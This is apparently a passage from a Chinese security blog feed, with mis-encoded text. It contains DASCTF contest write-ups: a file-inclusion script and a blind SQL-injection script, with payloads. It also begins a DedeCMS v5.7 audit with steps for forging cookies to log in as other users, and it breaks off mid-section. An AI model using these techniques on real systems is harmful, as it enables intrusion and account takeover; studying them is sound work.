    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Ezinclude"><a href="#1-Ezinclude" class="headerlink" title="1.Ezinclude"></a>1.Ezinclude</h3><p>  URLçš„è¯·æ±‚åŠ äº†ä¸ªunixæ—¶é—´æˆ³ï¼Œåªèƒ½å†™è„šæœ¬æ·¦ã€‚åé¢æµ‹è¯•å‘ç°gqy.jpgå’Œ/gqy.jpgå›æ˜¾ç›¸åŒï¼Œå¯ä»¥åˆ¤æ–­æ–‡ä»¶åå‰æ‹¼æ¥äº†è·¯å¾„ï¼Œè¿™ç§æƒ…å†µæ— æ³•ä½¿ç”¨wrapperç­‰æ‰‹æ®µçš„ã€‚åŒæ—¶wafä¹Ÿä¼šè¿‡æ»¤ <code>../</code>ã€‚å°è¯•å¤šæ¬¡éƒ½æ²¡åŒ…å«æˆåŠŸï¼Œå°±å¼ºè¡Œç”¨äº†ä¸‹ä¼ªåè®®æˆåŠŸäº†ï¼Œåé¢çœ‹äº†æºç é†‰äº†ï¼Œå¦‚æœfå‚æ•°çš„å¼€å¤´ç»™å‡ºä¸€ä¸ªç›®å½•å†ç©¿è¶Šå°±å¯ä»¥ç»•è¿‡wafäº†ã€‚è¿™é‡Œçš„ä¼ªåè®®å°±ç›¸å½“äºç›®å½•ã€‚</p><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">file=<span class="string">b'php://filter/read=convert.base64-encode/resource=../../../../../../../../../../flag'</span></span><br><span class="line">t=int(time.time())</span><br><span class="line">f= base64.b64encode(file).decode()</span><br><span class="line">url = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t,f)</span><br><span class="line"><span class="comment">#print(url)</span></span><br><span class="line">res = requests.get(url=url)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'t'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you miss some parameters"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">'t'</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"what's your time?"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">'f'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">"/../"</span>)) === <span class="string">"/../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"../"</span>)) === <span class="string">"../"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"./"</span>)) === <span class="string">"./"</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"/."</span>)) === <span class="string">"/."</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">"//"</span>)) === <span class="string">"//"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You are not allowed to do that.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/img/'</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-SQLI"><a href="#2-SQLI" class="headerlink" title="2.SQLI"></a>2.SQLI</h3><p>å°±å¤§æ¦‚çœ‹äº†ä¸‹é¢˜ç›®ï¼Œåé¢æ¯”èµ›ç»“æŸç¯å¢ƒæ²¡äº†ï¼Œå°±çœ‹äº†ä¸‹<a href="https://www.gem-love.com/ctf/2514.html" target="_blank" rel="noopener">y1ng</a>å¸ˆå‚…çš„é¢˜è§£</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L'Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment">#åº“å åˆ©ç”¨limitæ³¨å…¥ sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¡¨å flllaaaggg</span></span><br><span class="line">payload = <span class="string">'''SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema='sqlidb' GROUP BY table_name limit 0,1'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">true<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">truetruehost = <span class="string">'''http://183.129.189.60:10004/?id=1'=(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;char&#125;')%23'''</span>.format(payload=payload.replace(<span class="string">' '</span>,<span class="string">'/**/'</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">truetruer = req.get(host)</span><br><span class="line">truetrue<span class="keyword">if</span> <span class="string">r'admin666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">truetruetrueres += char</span><br><span class="line">truetruetrueprint(<span class="string">"found it: "</span>+res)</span><br><span class="line">truetruetrue<span class="keyword">break</span></span><br><span class="line">truetruet.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºå¯ä»¥è”åˆæ³¨å…¥ï¼Œæ‰€ä»¥ç›´æ¥è”åˆæŸ¥è¡¨ä¹Ÿè¡Œ</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span><span class="comment">/**/</span>sys.x$schema_flattened_keys<span class="comment">/**/</span><span class="keyword">WHERE</span><span class="comment">/**/</span>table_schema=<span class="string">'sqlidb'</span><span class="comment">/**/</span><span class="keyword">GROUP</span><span class="comment">/**/</span><span class="keyword">BY</span><span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>è·å–flag</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>:<span class="number">10004</span>/?id=<span class="number">100</span>â€™<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select<span class="comment">/**/</span>*,<span class="number">1</span><span class="comment">/**/</span><span class="built_in">from</span><span class="comment">/**/</span>flllaaaggg%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>è®°å½•ä¸€ä¸‹bypass information_schemaçš„åº“</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">host_summary</span> -&gt;</span> hostã€total_connections	å†å²è¿æ¥IPã€å¯¹åº”IPçš„è¿æ¥æ¬¡æ•°</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_schema</span> -&gt;</span> object_schema	åº“å</span><br><span class="line"> <span class="function"><span class="title">innodb_buffer_stats_by_table</span> -&gt;</span> object_schemaã€object_name	åº“åã€è¡¨å(å¯æŒ‡å®š)</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_bytes</span> -&gt;</span> file	è·¯å¾„ä¸­åŒ…å«åº“å</span><br><span class="line"> <span class="function"><span class="title">io_global_by_file_by_latency</span> -&gt;</span> file	è·¯å¾„ä¸­åŒ…å«åº“å</span><br><span class="line"> <span class="function"><span class="title">processlist</span> -&gt;</span> current_statementã€last_statement	å½“å‰æ•°æ®åº“æ­£åœ¨æ‰§è¡Œçš„è¯­å¥ã€è¯¥å¥æŸ„æ‰§è¡Œçš„ä¸Šä¸€æ¡è¯­å¥</span><br><span class="line"> <span class="function"><span class="title">schema_auto_increment_columns</span> -&gt;</span> table_schemaã€table_nameã€column_name	åº“åã€è¡¨åã€åˆ—å</span><br><span class="line"> <span class="function"><span class="title">schema_index_statistics</span> -&gt;</span> table_schemaã€table_name	åº“åã€è¡¨å</span><br><span class="line"> <span class="function"><span class="title">schema_object_overview</span> -&gt;</span> db	åº“å</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics</span> -&gt;</span> table_schemaã€table_name	åº“åã€è¡¨å</span><br><span class="line"> <span class="function"><span class="title">schema_table_statistics_with_buffer</span> -&gt;</span> table_schemaã€table_name	åº“åã€è¡¨å</span><br><span class="line"> <span class="function"><span class="title">schema_tables_with_full_table_scans</span> -&gt;</span> object_schemaã€object_name	åº“åã€è¡¨å(å…¨é¢æ‰«æè®¿é—®)</span><br><span class="line"> <span class="function"><span class="title">session</span> -&gt;</span> current_statementã€last_statement	å½“å‰æ•°æ®åº“æ­£åœ¨æ‰§è¡Œçš„è¯­å¥ã€è¯¥å¥æŸ„æ‰§è¡Œçš„ä¸Šä¸€æ¡è¯­å¥</span><br><span class="line"> <span class="function"><span class="title">statement_analysis</span> -&gt;</span> queryã€db	æ•°æ®åº“æœ€è¿‘æ‰§è¡Œçš„è¯·æ±‚ã€å¯¹äºè¯·æ±‚è®¿é—®çš„æ•°æ®åº“å</span><br><span class="line"> <span class="function"><span class="title">statementswith</span>* -&gt;</span> queryã€db	æ•°æ®åº“æœ€è¿‘æ‰§è¡Œçš„ç‰¹æ®Šæƒ…å†µçš„è¯·æ±‚ã€å¯¹åº”è¯·æ±‚çš„æ•°æ®åº“</span><br><span class="line"> <span class="function"><span class="title">version</span> -&gt;</span> mysql_version	mysqlç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line"> x$innodb_buffer_stats_by_schema	åŒinnodb_buffer_stats_by_schema</span><br><span class="line"> x$innodb_buffer_stats_by_table	åŒinnodb_buffer_stats_by_table</span><br><span class="line"> x$io_global_by_file_by_bytes	åŒio_global_by_file_by_bytes</span><br><span class="line"> <span class="function"><span class="title">x</span>$schema_flattened_keys -&gt;</span> table_schemaã€table_nameã€index_columns	åº“åã€è¡¨åã€ä¸»é”®å</span><br><span class="line"> <span class="function"><span class="title">x</span>$ps_schema_table_statistics_io -&gt;</span> table_schemaã€table_nameã€count_read	åº“åã€è¡¨åã€è¯»å–è¯¥è¡¨çš„æ¬¡æ•°</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-welcome-to-the-misc-world"><a href="#1-welcome-to-the-misc-world" class="headerlink" title="1.welcome to the misc world"></a>1.welcome to the misc world</h3><p>å’ŒåŒ—é‚®æ ¡èµ›çš„ä¸€é“é¢˜æŒºç±»ä¼¼çš„ï¼ŒLSBéšå†™ã€‚å¯ä»¥ç”¨<a href="https://0xcreed.jxustctf.top/2020/03/2020%E5%8C%97%E9%82%AE%E6%A0%A1%E8%B5%9B/#3-Hello-misc">è„šæœ¬</a>ä¹Ÿå¯ä»¥ç”¨<code>zsteg</code>,åˆ†ç¦»å¾—åˆ°ä¸€å¼ åŒ…å«å¯†ç çš„å›¾ç‰‡ã€‚</p>
<p><img src="/2020/07/DASCTF-7æœˆèµ›/image-20200726181457308.png" alt="image-20200726181457308"></p>
<p>å¾—åˆ°å¯†ç : <code>/*///1258/*/@#</code></p>
<p>è§£å‹åå¾—åˆ°hint.pngå’Œ7.pngã€‚hint.pngæœ€åæœ‰ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£ç åæ˜¯Unicode</p>
<p>![æ‰¹æ³¨ 2020-07-25 104650](DASCTF-7æœˆèµ›/æ‰¹æ³¨ 2020-07-25 104650.jpg)</p>
<p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£ç </p>
<p>![æ‰¹æ³¨ 2020-07-25 105244](DASCTF-7æœˆèµ›/æ‰¹æ³¨ 2020-07-25 105244.jpg)</p>
<p>æ‰¾äº†å¾ˆä¹…æ²¡æœ‰æ‰¾åˆ°ç–‘ä¼¼base85çš„å­—ç¬¦ä¸²</p>
<p>æœ€å7zæ‰“å¼€å‹ç¼©åŒ… ã€‚ã€‚ã€‚NTFSéšå†™</p>
<p>![æ‰¹æ³¨ 2020-07-25 113101](DASCTF-7æœˆèµ›/æ‰¹æ³¨ 2020-07-25 113101.jpg)</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DedeCMSv5.7SP2ä»£ç å®¡è®¡</title>
    <url>/2021/03/DedeCMSv5-7SP2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="å®¡è®¡ç¯å¢ƒ"><a href="#å®¡è®¡ç¯å¢ƒ" class="headerlink" title="å®¡è®¡ç¯å¢ƒ"></a>å®¡è®¡ç¯å¢ƒ</h3><p>PHP7.0</p><p>Apache</p><p>PHPSTORM</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯</p><p>dedecmsåœ¨php5.4ä»¥ä¸Šä¼šå› ä¸ºsession_register()ç­‰å‡½æ•°å·²ç§»é™¤ï¼Œæ— æ³•æ­£å¸¸è¿è¡Œ</p><p>åœ¨include/userlogin.class.phpä¸­ä»£ç æ›¿æ¢,è¢«æ›¿æ¢ä»£ç å¤§è‡´åœ¨288åˆ°304è¡Œä¹‹é—´,ä»£ç å¦‚ä¸‹:</p><p>ä»£ç å¦‚ä¸‹:</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepUserPurviewTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">@session_register</span>(<span class="variable">$this</span>-&gt;keepAdminStyleTag);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure><a id="more"></a>








<p>æ›¿æ¢ä¸ºå¦‚ä¸‹ä»£ç :</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;keepUserIDTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserIDTag] = <span class="variable">$this</span>-&gt;userID;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;keepUserTypeTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserTypeTag] = <span class="variable">$this</span>-&gt;userType;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;keepUserChannelTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserChannelTag] = <span class="variable">$this</span>-&gt;userChannel;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;keepUserNameTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserNameTag] = <span class="variable">$this</span>-&gt;userName;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;keepUserPurviewTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepUserPurviewTag] = <span class="variable">$this</span>-&gt;userPurview;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$this</span>-&gt;keepAdminStyleTag;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="variable">$this</span>-&gt;keepAdminStyleTag] = <span class="variable">$adminstyle</span>;</span><br></pre></td></tr></table></figure>

<p>364åˆ°368æ›¿æ¢å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserIDTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserTypeTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserChannelTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserNameTag);</span><br><span class="line"><span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keepUserPurviewTag);</span><br></pre></td></tr></table></figure>

<h3 id="cookieä¼ªé€ å¯¼è‡´ä»»æ„å‰å°ç”¨æˆ·ç™»å½•"><a href="#cookieä¼ªé€ å¯¼è‡´ä»»æ„å‰å°ç”¨æˆ·ç™»å½•" class="headerlink" title="cookieä¼ªé€ å¯¼è‡´ä»»æ„å‰å°ç”¨æˆ·ç™»å½•"></a><strong>cookieä¼ªé€ å¯¼è‡´ä»»æ„å‰å°ç”¨æˆ·ç™»å½•</strong></h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20103333.png" alt="å±å¹•æˆªå›¾ 2021-03-13 103333"></p>
<p> è·Ÿè¿›<code>PutCookie</code>æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­çš„ç¬¬27è¡Œä¸­å°†å€¼ä¸é…ç½®æ–‡ä»¶ä¸­çš„<code>$cfg_cookie_encode</code>è¿›è¡Œæ‹¼æ¥ï¼Œç„¶åè¿›è¡ŒMD5å’Œæˆªæ–­å¤„ç†<code>substr(md5($cfg_cookie_encode.$value),0,16)</code>ï¼Œç„¶åä¸‹å‘åˆ°å®¢æˆ·ç«¯</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313104510453.png" alt="image-20210313104510453"></p>
<p> è€Œåœ¨<code>include/common.inc.php</code>ä½¿ç”¨çš„å¤–éƒ¨å˜é‡æ³¨å†Œçš„æ–¹æ³•è¿›è¡Œå˜é‡å£°æ˜ï¼Œå› æ­¤æ­¤å¤„çš„$uidæ˜¯ç”¨æˆ·å¯æ§çš„ã€‚</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20104107.png" alt="å±å¹•æˆªå›¾ 2021-03-13 104107"></p>
<p> è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°ä»»æ„ç”¨æˆ·çš„<code>last_vid</code> <code>last_vid__ckMd5</code></p>
<p> è€Œåœ¨æ–‡ä»¶<code>include/helpers/cookie.helper.php</code>ä¸­çš„ç¬¬54-72è¡Œçš„GetCookieæ–¹æ³•çš„ä»£ç å—ï¼Œå…¶ä¸­ç¬¬63è¡Œç”¨äºæ ¡éªŒå®¢æˆ·ç«¯cookieæ˜¯å¦è¿›è¡Œäº†ä¼ªé€ ï¼Œå› æ­¤è¦è¿›è¡Œcookieå°±è‡ªç„¶æƒ³åˆ°è¦è·å–<code>uploads/data/config.cache.inc.php</code>æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œéœ€è¦å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æˆ–ä¸‹è½½çš„æ¼æ´ï¼Œå½“ç„¶è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹å¼ï¼Œå°±æ˜¯æ§åˆ¶<code>$uid</code>ï¼Œåˆ©ç”¨PutCookieç›´æ¥ç”Ÿæˆcookieï¼Œè¿™æ ·çš„cookieå®šä¼šé€šè¿‡GetCookieæ–¹æ³•ã€‚</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313105340716.png" alt="image-20210313105340716"></p>
</li>
</ul>
<p>   æ¥ç€æŸ¥çœ‹ç™»å½•ç›¸å…³çš„ä»£ç ï¼Œçœ‹å®ƒçš„cookieç”Ÿæˆæ–¹æ³•æ˜¯å¦æ˜¯PutCookieã€‚åœ¨<code>include/memberlogin.class.php</code> 498è¡ŒPutLoginInfoæ–¹æ³•å¤„ç†æ­£ç¡®è¾“å…¥ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µ</p>
<p>   <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313112216221.png" alt="image-20210313112216221"></p>
<p>   ç»§ç»­è·Ÿè¿›PutLoginInfoæ–¹æ³•ï¼Œæœç„¶ç”¨çš„æ˜¯PutCookieæ–¹æ³•ï¼Œå­˜åœ¨cookieä¼ªé€ æ¼æ´</p>
<p>   <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20112733.png" alt="å±å¹•æˆªå›¾ 2021-03-13 112733"></p>
<p>   åœ¨æ–‡ä»¶<code>include/memberlogin.class.php</code>çš„ç¬¬160-242è¡Œå‘ç°ä»£ç å—ï¼Œå…¶ä¸­ç¬¬170è¡Œæ£€æµ‹cookieä¸­çš„DedeUserIDå‚æ•°çš„å€¼ï¼Œ178è¡Œå°†è¿™ä¸ªå€¼è½¬æ¢ä¸ºæ•´æ•°ï¼Œ185è¡Œé€šè¿‡è¿™ä¸ªç»™å€¼æ¥æŸ¥è¯¢ç”¨æˆ·ã€‚æˆ‘ä»¬é€šè¿‡ä¼ªé€ DedeUserIDå³å¯ä»»æ„ç”¨æˆ·ç™»å½•äº†ã€‚</p>
<p>   <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20121536.png" alt="å±å¹•æˆªå›¾ 2021-03-13 121536"></p>
<ul>
<li><p>æ¼æ´å¤ç°</p>
<p> æƒ…å†µä¸€ï¼š</p>
<p> ç”±äºmidåœ¨æ•°æ®åº“ä¸­æ˜¯intï¼Œæ‰€ä»¥è¦è¿›è¡Œcookieçš„ä¼ªé€ éœ€è¦æ³¨å†Œç”¨æˆ·åä¸ºè¦è¶Šæƒçš„ç”¨æˆ·midæ•°å€¼ï¼Œè€Œadminé»˜è®¤ä¸º1ã€‚å› æ­¤å¯ä»¥ç›´æ¥ç™»å½•ä¸ºadminã€‚</p>
<p> éœ€è¦æ³¨å†Œç”¨æˆ·åä¸ºå¯¹åº”æ•°æ®åº“ä¸­dede_memberè¡¨ä¸­midå¯¹åº”çš„å€¼ã€‚å¦‚æ³¨å†Œç”¨æˆ·åä¸º0001å¯¹åº”dede_memberè¡¨ä¸­midä¸º1ï¼Œä¾¿æ˜¯adminçš„midã€‚</p>
<p> <img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20123051.png" alt="å±å¹•æˆªå›¾ 2021-03-13 123051"></p>
</li>
</ul>
<p>ç„¶åè®¿é—®<code>/member/index.php?uid=0001</code>è·å–ä¼ªé€ çš„cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130027.png" alt="å±å¹•æˆªå›¾ 2021-03-13 130027"></p>
<p>æœ€åè®¿é—®<code>/member/index.php</code>å¹¶å¸¦ä¸Šcookieå³å¯</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20130235.png" alt="å±å¹•æˆªå›¾ 2021-03-13 130235"></p>
<p>â€‹    æƒ…å†µäºŒï¼š</p>
<p>â€‹    åœ¨<code>member/index.php</code>æ–‡ä»¶ç¬¬124è¡Œï¼Œå½“uidä¸ä¸ºç©ºæ—¶ä¼š<code>require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;)</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313131650792.png" alt="image-20210313131650792"></p>
<p>â€‹    è·Ÿè¿›<code>member/inc/config_space.php</code>åœ¨ç¬¬29è¡Œè°ƒç”¨äº†GetUserSpaceInfosæ–¹æ³•</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313131855022.png" alt="image-20210313131855022"></p>
<p>â€‹    è·Ÿè¿›GetUserSpaceInfosæ–¹æ³•ï¼Œå…¶SQLæŸ¥è¯¢è¯­å¥ä½¿ç”¨äº†<code>like</code>è·å–æ•°æ®ï¼Œé€šè¿‡æ„é€ ç‰¹æ®Šçš„ç”¨æˆ·åå³å¯è®©å…¶ä¸‹å‘ä¼ªé€ cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20131954.png" alt="å±å¹•æˆªå›¾ 2021-03-13 131954"></p>
<p>è¿™é‡Œæˆ‘ä»¬å‡è®¾è¦ç™»å½•midä¸º5çš„ç”¨æˆ·</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313132505860.png" alt="image-20210313132505860"></p>
<p>æˆ‘ä»¬å…ˆæ³¨å†Œç±»ä¼¼äº<code>xx5xx</code>çš„ç”¨æˆ·</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313132632833.png" alt="image-20210313132632833"></p>
<p>ç„¶åè®¿é—®<code>/member/index.php?uid=%5%</code>è·å–ä¼ªé€ cookie</p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-13%20132811.png" alt="å±å¹•æˆªå›¾ 2021-03-13 132811"></p>
<p>åŠ ä¸Šcookieè®¿é—®<code>/member/index.php</code></p>
<p><img src="/2021/03/DedeCMSv5-7SP2ä»£ç å®¡è®¡/image-20210313132944373.png" alt="image-20210313132944373"></p>
<h3 id="ä»»æ„ä¿®æ”¹å‰å°ç”¨æˆ·å¯†ç "><a href="#ä»»æ„ä¿®æ”¹å‰å°ç”¨æˆ·å¯†ç " class="headerlink" title="ä»»æ„ä¿®æ”¹å‰å°ç”¨æˆ·å¯†ç "></a><strong>ä»»æ„ä¿®æ”¹å‰å°ç”¨æˆ·å¯†ç </strong></h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
